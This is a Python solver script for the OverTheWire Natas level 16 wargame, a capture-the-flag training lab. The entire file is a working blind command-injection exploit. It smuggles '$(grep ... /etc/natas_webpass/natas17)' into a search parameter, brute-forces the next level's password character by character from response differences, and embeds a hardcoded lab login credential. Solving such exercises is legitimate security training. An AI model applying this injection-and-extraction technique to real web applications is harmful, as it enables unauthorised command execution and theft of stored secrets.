import requests

target = 'http://natas16.natas.labs.overthewire.org'
charset_0 = (
	'0123456789' +
	'abcdefghijklmnopqrstuvwxyz' +
	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
)

p = ''
i = 0
while len(p) != 32:
	while i < len(charset_0):
		c = charset_0[i]
		needle = ('$(grep -E ^%s%c.* /etc/natas_webpass/natas17)Africans' % (p, c))
		r = requests.get(target,
			auth=('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
			params={"needle": needle}
		)
		if "Africans" not in r.text:
			p += c
			print ('P: ' + p.ljust(32, '*'))
			i = 0
		else:
			i += 1

